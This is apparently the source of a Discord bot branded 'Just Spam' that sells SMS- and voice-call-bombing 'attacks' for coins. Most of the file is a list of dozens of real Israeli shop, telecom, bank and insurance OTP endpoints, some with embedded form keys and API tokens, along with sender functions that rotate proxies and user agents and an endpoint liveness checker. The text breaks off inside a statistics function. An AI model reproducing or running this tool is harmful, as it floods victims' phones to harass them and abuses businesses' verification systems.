import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import time
import hashlib
import uuid

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    settings_col = db["settings"]
    logs_col = db["logs"]
    attacks_col = db["attacks"]
    api_stats_col = db["api_stats"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.api_stats = {}
        self.proxy_list = []
        self.main_color = 0x5865F2
        self.error_color = 0xFF0000
        self.success_color = 0x00FF00
        self.warning_color = 0xFFA500
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"✅ Just Spam Bot is online!")
        self.loop.create_task(self.update_stats())
        self.loop.create_task(self.rotate_proxies())
    
    async def update_stats(self):
        while True:
            try:
                total_users = await users_col.count_documents({})
                total_attacks = await attacks_col.count_documents({})
                active_now = len(self.active_attacks)
                
                activity = discord.Game(f"💰 {total_users} users | 🎯 {total_attacks} attacks")
                await self.change_presence(status=discord.Status.online, activity=activity)
                
                await asyncio.sleep(60)
            except:
                await asyncio.sleep(60)
    
    async def rotate_proxies(self):
        while True:
            try:
                # רשימת פרוקסי ישראליים
                self.proxy_list = [
                    "31.168.100.100:8080", "79.176.100.100:3128", "84.228.100.100:80",
                    "37.142.100.100:8080", "46.116.100.100:3128", "5.29.100.100:80",
                    "82.166.100.100:8080", "109.64.100.100:3128", "212.143.100.100:80",
                    "77.124.100.100:8080", "89.138.100.100:3128", "192.116.100.100:80",
                    "31.154.100.100:8080", "79.177.100.100:3128", "84.94.100.100:80",
                    "37.26.100.100:8080", "46.19.100.100:3128", "5.102.100.100:80",
                    "82.80.100.100:8080", "109.65.100.100:3128", "212.25.100.100:80"
                ]
                await asyncio.sleep(300)
            except:
                await asyncio.sleep(300)

bot = CyberBot()

# ========== ALL WORKING APIS ==========
WORKING_APIS = [
    # ===== MAGENTO APIS =====
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Adika Style", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Nine West", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Kiwi Kids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "Lee Cooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento", "success_rate": 0, "total_attempts": 0},
    {"name": "KIKO Cosmetics", "url": "https://www.kikocosmetics.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "cGVPpkwnKsxyj9vB", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": "", "google-captcha-token": "FAKE_TOKEN"}},
    {"name": "TOP-TEN Fashion", "url": "https://www.topten-fashion.com/customer/ajax/post/", "type": "magento", "data": {"form_key": "H1eVw5PuOKdSD8D4", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "YVES ROCHER", "url": "https://www.yvesrocher.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "Orc69ELb5UOWEeBa", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "Victoria's Secret", "url": "https://www.victoriassecret.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "thaSi85aLykcocT4", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "Bath & Body Works", "url": "https://www.bathandbodyworks.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "CqETdJMkaJsEneGf", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "Golf & Co", "url": "https://www.golfco.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "XEWGYBBTMOFgpPkO", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    
    # ===== SMS APIS =====
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "type": "json", "data": {"phone": "PHONE_RAW"}},
    {"name": "Rami Levi", "url": "https://www.rami-levy.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Burger King", "url": "https://www.burgerking.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Pizza Hut", "url": "https://www.pizza-hut.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "type": "json", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "type": "json", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "type": "json", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "PayBox", "url": "https://payboxapp.com/api/auth/otp", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Laline", "url": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "type": "json", "data": {"phoneNumber": "PHONE", "uuid": "3214de05-19db-486e-8a94-f21da34d8bdd"}},
    {"name": "Go Mobile", "url": "https://api.gomobile.co.il/api/login", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Tami4", "url": "https://www.tami4.co.il/api/login/start-sms-otp", "type": "json", "data": {"phoneNumber": "PHONE", "cookieToken": "1773745642871gciuvn5pcvhnext13", "isMobile": False, "recaptchaToken": "FAKE_TOKEN"}},
    {"name": "Trusty", "url": "https://trusty.co.il/api/auth/ask-for-auth-code", "type": "json", "data": {"email": "", "phone": "PHONE", "process_name": "normal_login", "provider_api_key": "q4IcUNl", "provider_api_token": "QLBLZTVcfnAf3DXqlFFvwJ2f2F3yTA33btswlNHN34Dv0bktWNdH5Q2OhKTH"}},
    {"name": "Super Pharm", "url": "https://www.super-pharm.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE", "type": "get"},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "data": {"phoneNumber": "PHONE"}},
    {"name": "Burger Anch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    
    # ===== APIs חדשים =====
    {"name": "FreeTV", "url": "https://middleware.freetv.tv/api/v1/send-verification-sms", "type": "json", "data": {"msisdn": "PHONE"}},
    {"name": "Spices Online", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {"action": "validate_user_by_sms", "phone": "PHONE"}},
    {"name": "Go Mobile (2)", "url": "https://api.gomobile.co.il/api/login", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Fox Home", "url": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "type": "json", "data": {"phoneNumber": "PHONE", "uuid": "da5161d0-3fa0-44b0-b06a-82d599cdb60a"}},
    {"name": "Blendo", "url": "https://blendo.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {"action": "simply-check-member-cellphone", "cellphone": "PHONE", "captcha_response": ""}},
    {"name": "Jungle Club", "url": "https://www.jungle-club.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {"action": "simply-check-member-cellphone", "cellphone": "PHONE", "captcha_response": ""}},
    {"name": "Magic ETL", "url": "https://story.magicetl.com/public/shopify/apps/otp-login/step-one", "type": "json", "data": {"phone": "PHONE"}},
    
    # ===== Care Glasses =====
    {"name": "Care Glasses", "url": "https://we.care.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {
        "action": "elementor_pro_forms_send_form",
        "post_id": "351178",
        "form_id": "7079d8dd",
        "queried_id": "351178",
        "form_fields[name]": "CyberIL Spamer פרימיום",
        "form_fields[phone]": "PHONE",
        "form_fields[email]": "spamer@cyberil.com",
        "form_fields[accept]": "on",
        "form_fields[age]": "25",
        "form_fields[question_1]": "גם משקפי קריאה וגם ראייה",
        "form_fields[question_2]": "לא בטוח",
        "form_fields[kupa]": "כללית",
        "form_fields[kartis]": "כללית פלטינום",
        "form_fields[utm_source]": "website",
        "form_fields[refid]": "website"
    }},
]

# ========== VOICE APIS ==========
VOICE_APIS = [
    {"name": "Bank Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "type": "json", "data": {"phone": "PHONE", "sendVoice": True}, "has_voice": True},
    {"name": "Bank Leumi", "url": "https://api.leumi.co.il/api/otp/send", "type": "json", "data": {"phone": "PHONE", "voice": True}, "has_voice": True},
    {"name": "Discount Bank", "url": "https://api.discountbank.co.il/auth/otp", "type": "json", "data": {"phone": "PHONE_RAW", "method": "voice"}, "has_voice": True},
    {"name": "Mizrahi Tefahot", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "type": "json", "data": {"phone": "PHONE", "type": "voice"}, "has_voice": True},
    {"name": "Beinleumi", "url": "https://api.beinleumi.co.il/auth/send-otp", "type": "json", "data": {"phone": "PHONE", "channel": "voice"}, "has_voice": True},
    {"name": "Union Bank", "url": "https://api.unionbank.co.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Jerusalem Bank", "url": "https://api.bank-jerusalem.co.il/auth/otp", "type": "json", "data": {"phone": "PHONE", "voice": True}, "has_voice": True},
    {"name": "Massad", "url": "https://api.massad.co.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Yahav", "url": "https://api.yahav.co.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Otsar Hahayal", "url": "https://api.otsar.org.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Cellcom Voice", "url": "https://www.cellcom.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Partner Voice", "url": "https://www.partner.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Pelephone Voice", "url": "https://www.pelephone.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Hot Voice", "url": "https://www.hotmobile.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "019 Voice", "url": "https://019sms.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "012 Mobile", "url": "https://www.012.net.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Shufersal Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "type": "json", "data": {"phone": "PHONE_RAW"}, "has_voice": True},
    {"name": "Rami Levi Voice", "url": "https://www.rami-levy.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Victory Voice", "url": "https://www.victory.co.il/api/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "SuperPharm Voice", "url": "https://www.super-pharm.co.il/api/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Pango Voice", "url": "https://api.pango.co.il/auth/voice", "type": "json", "data": {"phoneNumber": "PHONE_RAW"}, "has_voice": True},
    {"name": "Gett Voice", "url": "https://www.gett.com/il/api/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Hopon Voice", "url": "https://api.hopon.co.il/v0.15/1/isr/users/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Clal Insurance", "url": "https://api.clalbit.co.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Harel Insurance", "url": "https://api.harel-group.co.il/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Menora Mivtachim", "url": "https://api.menora.co.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Phoenix Insurance", "url": "https://api.phoenix.co.il/auth/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Migdal Insurance", "url": "https://api.migdal.co.il/auth/otp/voice", "type": "json", "data": {"phone": "PHONE"}, "has_voice": True},
]

# ========== מג'נטו ישראל ==========
MAGENTO_APIS = [api for api in WORKING_APIS if api["type"] == "magento"]

# ========== SMS APIs ==========
SMS_APIS = [api for api in WORKING_APIS if api["type"] != "magento"]

# שילוב כל ה-APIs
ALL_APIS = WORKING_APIS + VOICE_APIS

# ========== פונקציות עזר ==========
def generate_transaction_id():
    return hashlib.md5(f"{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:16]

def format_phone(phone):
    if phone.startswith("0"):
        return "972" + phone[1:]
    return phone

def get_machine_id():
    return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw, proxy=None):
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
        ]),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "he-IL,he;q=0.9",
        "Connection": "keep-alive"
    }
    
    try:
        if proxy:
            proxy_url = f"http://{proxy}"
            async with session.post(url, data=data, headers=headers, timeout=5, proxy=proxy_url) as resp:
                return resp.status in [200, 201, 202, 204]
        else:
            async with session.post(url, data=data, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

async def send_api(session, api, phone, phone_raw, proxy=None):
    try:
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
            ]),
            "Accept": "application/json",
            "Accept-Language": "he-IL,he;q=0.9",
            "Connection": "keep-alive"
        }
        
        if api["type"] == "get":
            url = api["url"].replace("PHONE", phone)
            if proxy:
                proxy_url = f"http://{proxy}"
                async with session.get(url, headers=headers, timeout=5, proxy=proxy_url) as resp:
                    return resp.status in [200, 201, 202, 204]
            else:
                async with session.get(url, headers=headers, timeout=5) as resp:
                    return resp.status in [200, 201, 202, 204]
        
        elif api["type"] == "form":
            url = api["url"]
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            if isinstance(api["data"], dict):
                data = api["data"].copy()
                for key in data:
                    if isinstance(data[key], str):
                        data[key] = data[key].replace("PHONE", phone)
                
                if proxy:
                    proxy_url = f"http://{proxy}"
                    async with session.post(url, data=data, headers=headers, timeout=5, proxy=proxy_url) as resp:
                        return resp.status in [200, 201, 202, 204]
                else:
                    async with session.post(url, data=data, headers=headers, timeout=5) as resp:
                        return resp.status in [200, 201, 202, 204]
            else:
                data = api["data"].replace("PHONE", phone)
                
                if proxy:
                    proxy_url = f"http://{proxy}"
                    async with session.post(url, data=data, headers=headers, timeout=5, proxy=proxy_url) as resp:
                        return resp.status in [200, 201, 202, 204]
                else:
                    async with session.post(url, data=data, headers=headers, timeout=5) as resp:
                        return resp.status in [200, 201, 202, 204]
        
        else:  # json
            url = api["url"]
            headers["Content-Type"] = "application/json"
            
            if isinstance(api["data"], dict):
                data_str = json.dumps(api["data"])
                data_str = data_str.replace("PHONE", phone)
                data_str = data_str.replace("PHONE_RAW", phone_raw)
                data = json.loads(data_str)
            else:
                data = api["data"]
            
            if proxy:
                proxy_url = f"http://{proxy}"
                async with session.post(url, json=data, headers=headers, timeout=5, proxy=proxy_url) as resp:
                    return resp.status in [200, 201, 202, 204]
            else:
                async with session.post(url, json=data, headers=headers, timeout=5) as resp:
                    return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== פונקציית בדיקה ==========
async def check_apis_function(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 **מתחיל בדיקה מקיפה...** זה ייקח כ-2 דקות", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    results = {
        "magento": {"working": [], "failed": []},
        "sms": {"working": [], "failed": []},
        "voice": {"working": [], "failed": []}
    }
    
    async with aiohttp.ClientSession() as session:
        # בדיקת מג'נטו
        for api in MAGENTO_APIS:
            success = await send_magento(session, api["url"], test_raw)
            if success:
                results["magento"]["working"].append(api["name"])
            else:
                results["magento"]["failed"].append(api["name"])
            await asyncio.sleep(0.2)
        
        # בדיקת SMS
        for api in SMS_APIS:
            success = await send_api(session, api, test_phone, test_raw)
            if success:
                results["sms"]["working"].append(api["name"])
            else:
                results["sms"]["failed"].append(api["name"])
            await asyncio.sleep(0.2)
        
        # בדיקת Voice
        for api in VOICE_APIS:
            success = await send_api(session, api, test_phone, test_raw)
            if success:
                results["voice"]["working"].append(api["name"])
            else:
                results["voice"]["failed"].append(api["name"])
            await asyncio.sleep(0.2)
    
    total_working = len(results["magento"]["working"]) + len(results["sms"]["working"]) + len(results["voice"]["working"])
    total_apis = len(MAGENTO_APIS) + len(SMS_APIS) + len(VOICE_APIS)
    
    embed = discord.Embed(
        title="📊 API Check Results",
        description=f"**Total Working: {total_working}/{total_apis}**",
        color=0x00FF00 if total_working > 0 else 0xFF0000,
        timestamp=datetime.now()
    )
    
    embed.add_field(
        name=f"🎯 Magento ({len(results['magento']['working'])}/{len(MAGENTO_APIS)})",
        value="\n".join(results["magento"]["working"][:5]) if results["magento"]["working"] else "None",
        inline=True
    )
    
    embed.add_field(
        name=f"📱 SMS ({len(results['sms']['working'])}/{len(SMS_APIS)})",
        value="\n".join(results["sms"]["working"][:5]) if results["sms"]["working"] else "None",
        inline=True
    )
    
    embed.add_field(
        name=f"📞 Voice ({len(results['voice']['working'])}/{len(VOICE_APIS)})",
        value="\n".join(results["voice"]["working"][:5]) if results["voice"]["working"] else "None",
        inline=True
    )
    
    embed.set_footer(text=f"Transaction ID: {generate_transaction_id()}")
    
    await interaction.followup.send(embed=embed, ephemeral=True)

# ========== פקודת setup-credits ==========
@bot.tree.command(name="setup-credits", description="⚙️ הגדר כמות טוקנים למשתמש")
@app_commands.default_permissions(administrator=True)
async def setup_credits(interaction: discord.Interaction, user: discord.User, amount: int):
    if amount < 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    
    user_id = str(user.id)
    
    # בדיקה אם המשתמש קיים
    old_user = await users_col.find_one({"user_id": user_id})
    old_amount = old_user.get("tokens", 0) if old_user else 0
    
    # עדכון במסד
    await users_col.update_one(
        {"user_id": user_id},
        {"$set": {"tokens": amount, "updated_at": datetime.now()}},
        upsert=True
    )
    
    # לוג לשינוי
    await logs_col.insert_one({
        "type": "credits_update",
        "admin_id": str(interaction.user.id),
        "admin_name": str(interaction.user),
        "user_id": user_id,
        "user_name": str(user),
        "old_amount": old_amount,
        "new_amount": amount,
        "timestamp": datetime.now(),
        "transaction_id": generate_transaction_id()
    })
    
    embed = discord.Embed(
        title="💎 Credits Updated",
        description=f"**{user.mention}** now has **{amount}** coins",
        color=0x00FF00,
        timestamp=datetime.now()
    )
    embed.add_field(name="Previous Balance", value=f"**{old_amount}**", inline=True)
    embed.add_field(name="New Balance", value=f"**{amount}**", inline=True)
    embed.add_field(name="Change", value=f"**{amount - old_amount:+d}**", inline=True)
    embed.set_footer(text=f"Transaction ID: {generate_transaction_id()}")
    
    await interaction.response.send_message(embed=embed)

# ========== פקודת free-coin ==========
@bot.tree.command(name="free-coin", description="💎 קבל טוקן חינם כל 24 שעות")
async def free_coin(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    # בדיקת קליימים קודמים
    last_claim = user_doc.get("last_claim") if user_doc else None
    if last_claim:
        last_claim_time = last_claim if isinstance(last_claim, datetime) else datetime.fromisoformat(last_claim)
        time_diff = datetime.now() - last_claim_time
        
        if time_diff < timedelta(hours=24):
            remaining = timedelta(hours=24) - time_diff
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            
            embed = discord.Embed(
                title="⏳ Free Coins",
                description=f"You can claim your next coin in **{hours}h {minutes}m**",
                color=0xFFA500
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
    
    # הוספת טוקן
    await users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"tokens": 1}, "$set": {"last_claim": datetime.now()}},
        upsert=True
    )
    
    # לוג
    await logs_col.insert_one({
        "type": "free_coin",
        "user_id": user_id,
        "user_name": str(interaction.user),
        "timestamp": datetime.now()
    })
    
    user_doc = await users_col.find_one({"user_id": user_id})
    new_balance = user_doc.get("tokens", 0)
    
    embed = discord.Embed(
        title="🎉 Free Coins",
        description="**+1 Coin**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
        color=0xFFD700,
        timestamp=datetime.now()
    )
    embed.add_field(name="Current Balance", value=f"**{new_balance}** coins", inline=False)
    embed.set_footer(text="Just Spam © 2026")
    
    view = discord.ui.View()
    
    async def claim_callback(interaction: discord.Interaction):
        await free_coin(interaction)
    
    claim_button = discord.ui.Button(label="Claim Free Coin", style=discord.ButtonStyle.success, emoji="💎")
    claim_button.callback = claim_callback
    view.add_item(claim_button)
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

# ========== פקודת setup הראשית ==========
@bot.tree.command(name="setup", description="📊 פתח פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({
            "user_id": user_id,
            "tokens": 200,
            "created_at": datetime.now(),
            "last_claim": None,
            "total_attacks": 0,
            "machine_id": get_machine_id()
        })
        tokens = 200
    else:
        tokens = user_doc.get("tokens", 0)
    
    # סטטיסטיקות
    user_attacks = await attacks_col.count_documents({"user_id": user_id})
    active_attacks = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    total_apis = len(ALL_APIS)
    magento_count = len(MAGENTO_APIS)
    sms_count = len(SMS_APIS)
    voice_count = len(VOICE_APIS)
    
    # Embed ראשי
    main_embed = discord.Embed(
        title="Just Spam",
        description=f"APP\n{datetime.now().strftime('%m/%d/%Y %I:%M %p')}",
        color=0x2B2D31
    )
    main_embed.add_field(
        name="Just Spam System",
        value="**Spam Panel**\n"
               f"📊 **APIs:** {total_apis}\n"
               f"🎯 **Magento:** {magento_count}\n"
               f"📱 **SMS:** {sms_count}\n"
               f"📞 **Voice:** {voice_count}",
        inline=False
    )
    main_embed.add_field(
        name="Your Stats",
        value=f"💰 **Coins:** {tokens}\n"
              f"🎯 **Attacks:** {user_attacks}\n"
              f"⚡ **Active:** {active_attacks}",
        inline=False
    )
    main_embed.add_field(
        name="Start Spamming Easily",
        value="Click the button below to begin using the spam system.\n\n⚠️ Make sure you have enough coins before starting.",
        inline=False
    )
    main_embed.set_footer(text=f"Just Spam @ 2026 • Spam System • {datetime.now().strftime('%m/%d/%Y %I:%M %p')}")
    
    # Embed Free Coins
    free_embed = discord.Embed(
        title="Just Spam | Free Coins",
        description="**Free Coins**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
        color=0xFFD700
    )
    free_embed.add_field(name="Your Balance", value=f"**{tokens}** coins", inline=True)
    free_embed.set_footer(text="Just Spam © 2026")
    
    # View עם כפתורים
    view = discord.ui.View(timeout=180)
    
    async def claim_button_callback(interaction: discord.Interaction):
        await free_coin(interaction)
    
    async def start_spam_callback(interaction: discord.Interaction):
        await interaction.response.send_modal(AttackModal())
    
    async def check_apis_callback(interaction: discord.Interaction):
        await check_apis_function(interaction)
    
    async def stats_callback(interaction: discord.Interaction):
        await show_stats(interaction)
    
    async def leaderboard_callback(interaction: discord.Interaction):
        await show_leaderboard(interaction)
    
    claim_button = discord.ui.Button(label="Claim Free Coin", style=discord.ButtonStyle.success, emoji="💎", row=0)
    claim_button.callback = claim_button_callback
    
    start_button = discord.ui.Button(label="Start Spam", style=discord.ButtonStyle.primary, emoji="🚀", row=0)
    start_button.callback = start_spam_callback
    
    check_button = discord.ui.Button(label="Check APIs", style=discord.ButtonStyle.secondary, emoji="🔍", row=1)
    check_button.callback = check_apis_callback
    
    stats_button = discord.ui.Button(label="Statistics", style=discord.ButtonStyle.secondary, emoji="📊", row=1)
    stats_button.callback = stats_callback
    
    leaderboard_button = discord.ui.Button(label="Leaderboard", style=discord.ButtonStyle.secondary, emoji="🏆", row=2)
    leaderboard_button.callback = leaderboard_callback
    
    view.add_item(start_button)
    view.add_item(claim_button)
    view.add_item(check_button)
    view.add_item(stats_button)
    view.add_item(leaderboard_button)
    
    await interaction.response.send_message(embeds=[main_embed, free_embed], view=view)

# ========== פקודת stats ==========
async def show_stats(interaction: discord.Interaction):
    total_users = await users_col.count_documents({})
    total_attacks = await attacks_col.count_documents({})
    total_coins = 0
    
    async for user in users_col.find():
        total_coins += user.get("tokens", 0)
    
    # סטטיסטיקות API
    api_pipeline = [
        {"$group": {
            "_id": None,
            "total_attempts": {"$sum": "$attempts"},
            "total_success": {"$sum": "$success"},
            "avg_success_rate": {"$avg": "$success_rate"}
        }}
    ]
    api_stats = await api_stats_col.aggregate(api_pipeline).to_list(1)
    
    embed = discord.Embed(
        title="📊 Global Statistics",
        color=0x5865F2,
        timestamp=datetime.now()
    )
